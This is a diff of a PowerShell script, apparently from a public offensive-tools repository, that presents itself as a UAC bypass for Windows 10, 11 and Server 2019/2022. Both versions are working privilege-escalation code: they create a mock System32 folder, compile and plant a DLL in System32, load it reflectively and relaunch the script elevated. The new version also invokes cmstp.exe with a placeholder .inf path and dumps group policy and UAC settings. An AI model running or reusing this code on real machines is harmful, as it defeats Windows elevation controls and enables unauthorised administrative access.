@@ -1,54 +1,34 @@
-# Author: P.Hoogeveem
-# The main .ps1 file been re-dev by dev: @keytrap-x86
-# Aka: x0xr00t
-# Build: 20210809
+# Author: P.Hoogeveen | aka: x0xr00t | Team: Sl0ppyRoot
+# Name: UAC Bypass for Windows 10 and Server 2019/2022
+# The main .ps1 file been re-dev by dev: @keytrap-x86 (partial, os version check) Thanks sir (Y)
+# Build: 20241007
 # Name: UAC Bypass Win Server 2019| Win Server 2022 | Win 10 | Win 11 | win 12 pre-release
-# Impact: Privesc
-# Method: DllReflection
-# Usage: Run the .ps1 file.
+# Impact: Privilege Escalation
+# Method: DllReflection and CMSTP Bypass
 
-# Function to get the PowerShell location
-function Get-PowerShellLocation {
-    # Try to find PowerShell v7
-    $pwshPath = "C:\Program Files\PowerShell\7\pwsh.exe"
-    if (Test-Path $pwshPath) {
-        return $pwshPath
+function Get-PSLocation {
+    $paths = @(
+        "C:\Program Files\PowerShell\7\pwsh.exe",
+        "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+    )
+
+    foreach ($path in $paths) {
+        if (Test-Path $path) {
+            return $path
+        }
     }
 
-    # Try to find PowerShell v2
-    $psPath = Join-Path $env:SystemRoot "System32\WindowsPowerShell\v1.0\powershell.exe"
-    if (Test-Path $psPath) {
-        return $psPath
-    }
-
-    # Try to find PowerShell v1
-    $psv1Path = Join-Path $env:SystemRoot "System32\WindowsPowerShell\v1.0\powershell.exe"
-    if (Test-Path $psv1Path) {
-        return $psv1Path
-    }
-
-    # PowerShell not found
     Write-Host "PowerShell location not found." -ForegroundColor Red
     exit
 }
 
-# Get the PowerShell location
-$PowerShellLocation = Get-PowerShellLocation
+$PSLocation = Get-PSLocation
 
-Write-Host ""
-Write-Host ""
-Write-Host ""
-Write-Host " 000000000000000000000000000000000000000000"
-Write-Host " 0 Sl0ppyR00t Gonna Check the OS version. 0"
-Write-Host " 0      We do the UAC based on the OS     0"
-Write-Host " 0    So that you don't need to check it. 0"
-Write-Host " 0            Team Sl0ppyRoot             0"
-Write-Host " 0               ~x0xr00t~                0"
-Write-Host " 000000000000000000000000000000000000000000"
-Write-Host ""
-Write-Host ""
-$user = $(cmd.exe /c echo %username%)
-# OS-Check
+Write-Host "---------------------------------------"
+Write-Host " Sl0ppyR00t: Checking OS version..."
+Write-Host "---------------------------------------"
+
+$user = (cmd.exe /c echo %username%)
 $OSVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName).ProductName
 
 $supportedVersions = @(
@@ -80,147 +60,58 @@ $supportedVersions = @(
 
 if ($supportedVersions -notcontains $OSVersion) {
     Write-Host "Unsupported OS version: $OSVersion"
-    Write-Host "Exiting..."
     exit
 } else {
-    Write-Host " 0000000000000000000000000000000000000000000"
-    Write-Host " 0 Sl0ppyR00t says it's a $OSVersion! 0"
-    Write-Host " 0000000000000000000000000000000000000000000"
-    Write-Host ""
-    Write-Host ""
+    Write-Host " Running on supported OS: $OSVersion"
 }
 
-Write-Host " 00000000000000000000000000000000000000"
-Write-Host " 0 Sl0ppyR00t Making Mock Folder..... 0"
-Write-Host " 00000000000000000000000000000000000000"
-New-Item "\\?\C:\Windows\System32" -ItemType Directory
-Write-Host ""
-Write-Host ""
-Write-Host " {Sl0ppyr00t} Making Mock Folder of (C:\windows /system32) is done."
-Write-Host ""
-Write-Host ""
-Write-Host " 00000000000000000000000000000000000000"
-Write-Host " 0 Sl0ppyR00t Making DLL Files ...... 0"
-Write-Host " 00000000000000000000000000000000000000"
-Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
-Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "C:\Windows \System32\sl0p.dll"
-Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "C:\Windows \sl0p.dll"
-Write-Host ""
-Write-Host ""
-Write-Host " {Sl0ppyr00t} Making DLL files is done."
-Write-Host ""
-Write-Host ""
-Write-Host " 0000000000000000000000000000000000000"
-Write-Host " 0 Sl0ppyR00t Copy DLL Files to Mock 0"
-Write-Host " 0000000000000000000000000000000000000"
-Copy-Item "sl0p.dll" -Destination "C:\Windows\System32"
-Copy-Item "sl0p.dll" -Destination "C:\Windows \"
-Write-Host ""
-Write-Host ""
-Write-Host " {Sl0ppyr00t} Copy Dll to Mock Folder of system32 is done."
-Write-Host ""
-Write-Host ""
-Write-Host " 0000000000000000000000000000000000000000"
-Write-Host " 0 Sl0ppyR00t Verify Place of DLL Files 0"
-Write-Host " 0000000000000000000000000000000000000000"
-Get-ChildItem "C:\Windows \System32\sl0p.dll"
-Get-ChildItem "C:\Windows \sl0p.dll"
-Write-Host ""
-Write-Host ""
-Write-Host " {Sl0ppyr00t} File Is there."
-[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
-
-$currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
-$testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-if ($testadmin -eq $false) {
-Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
-exit $LASTEXITCODE
+# Create a mock folder
+$mockFolderPath = "C:\Windows\System32\MockFolder"
+if (-not (Test-Path $mockFolderPath)) {
+    New-Item -Path $mockFolderPath -ItemType Directory | Out-Null
+    Write-Host "Mock folder created at $mockFolderPath."
 }
-# Get the ID and security principal of the current user account
 
-$myWindowsID = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-$myWindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($myWindowsID)
-Get the security principal for the Administrator role
+# Compiling DLLs
+Write-Host " Compiling DLL files..."
+Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "$mockFolderPath\sl0p.dll"
+Write-Host "DLL files created."
 
-$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
-# Check to see if we are currently running "as Administrator"
+# Copy DLL files to System32
+Copy-Item "$mockFolderPath\sl0p.dll" -Destination "C:\Windows\System32\sl0p.dll" -Force
+Write-Host "DLL copied to System32."
 
-if ($myWindowsPrincipal.IsInRole($adminRole)) {
-# We are running "as Administrator" - so change the title and background color to indicate this
-$Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Sl0ppyr00t=000==Elevated==0000)"
-$Host.UI.RawUI.BackgroundColor = "DarkRed"
-Clear-Host
+# Verify DLL placement
+if (Test-Path "C:\Windows\System32\sl0p.dll") {
+    Write-Host "DLL verification successful."
 } else {
-# We are not running "as Administrator" - so relaunch as administrator
-
-# Create a new process object that starts PowerShell
-$newProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell"
-
-# Specify the current script path and name as a parameter
-$newProcess.Arguments = $myInvocation.MyCommand.Definition
-
-# Indicate that the process should be elevated
-$newProcess.Verb = "runas"
-
-# Start the new process
-[System.Diagnostics.Process]::Start($newProcess)
-
-# Exit from the current, unelevated, process
-exit
-
+    Write-Host "DLL not found in System32." -ForegroundColor Red
 }
 
-# Get the ID and security principal of the current user account
-$myWindowsID = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-$myWindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($myWindowsID)
-Get the security principal for the Administrator role
+# Load DLL
+[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$mockFolderPath\sl0p.dll"))
 
-$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
-# Check to see if we are currently running "as Administrator"
-
-if ($myWindowsPrincipal.IsInRole($adminRole)) {
-
-# We are running "as Administrator" - so change the title and background color to indicate this
-$Host.UI.RawUI.WindowTitle = $myInvocation.MyCommand.Definition + "(Sl0ppyr00t=000==Elevated==0000)"
-$Host.UI.RawUI.BackgroundColor = "DarkRed"
-Clear-Host
-} else {
-
-# We are not running "as Administrator" - so relaunch as administrator
-# Create a new process object that starts PowerShell
-$newProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell"
-
-# Specify the current script path and name as a parameter
-$newProcess.Arguments = $myInvocation.MyCommand.Definition
-
-# Indicate that the process should be elevated
-$newProcess.Verb = "runas"
-
-# Start the new process
-[System.Diagnostics.Process]::Start($newProcess)
-
-# Exit from the current, unelevated, process
-exit
-
+# Check for admin privileges
+$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}"' -f $myinvocation.MyCommand.Definition)
+    exit
 }
 
-Write-Host "------------------------"
-Write-Host "- Getting user scope -"
-Write-Host "------------------------"
-Start-Sleep -Seconds 5
+# Call CMSTP Bypass if applicable
+if ($OSVersion -match "Windows 10|Windows 11|Windows Server 2019|Windows Server 2022") {
+    Write-Host "Executing CMSTP bypass..."
+    Start-Process "cmstp.exe" -ArgumentList "/s", "C:\Path\To\Your\CMSTPProfile.inf"
+}
+
+# Display Group Policy Results
+Write-Host "Getting user scope..."
 gpresult /Scope User /v
-Write-Host ""
-Start-Sleep -Seconds 2
-Write-Host "------------------------"
-Write-Host "- Getting system scope -"
-Write-Host "------------------------"
-Start-Sleep -Seconds 5
+
+Write-Host "Getting system scope..."
 gpresult /Scope Computer /v
-Write-Host ""
-Start-Sleep -Seconds 2
-Write-Host "------------------------"
-Write-Host "- Getting LUA Settings -"
-Write-Host "------------------------"
-Start-Sleep -Seconds 5
+
+Write-Host "Getting LUA Settings..."
 Get-ItemProperty HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system
+
 Write-Host "________________________"
